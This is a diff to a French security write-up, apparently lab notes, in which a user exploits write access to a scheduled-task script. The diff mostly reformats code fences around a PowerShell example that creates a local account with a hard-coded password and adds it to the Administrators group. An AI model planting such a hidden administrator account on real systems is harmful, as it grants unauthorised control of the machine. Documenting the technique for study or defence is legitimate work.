@@ -339,8 +339,7 @@ Attaque :
 L'utilisateur se doit de créer un compte admin local grace a son droit de changer le fichier de script dans les taches planifiés
 
 Exemple de script : 
-'''powershell
-    # Nom de l'utilisateur à créer
+```powershell
 $username = "NomUtilisateur"
 
 $password = "MotDePasse123!"
@@ -352,6 +351,8 @@ New-LocalUser -Name $username -Password $securePassword -FullName "Nom Complet" 
 Add-LocalGroupMember -Group "Administrators" -Member $username
 
 Write-Host "Utilisateur $username créé et ajouté au groupe Administrators."
+
+```
 
 
 
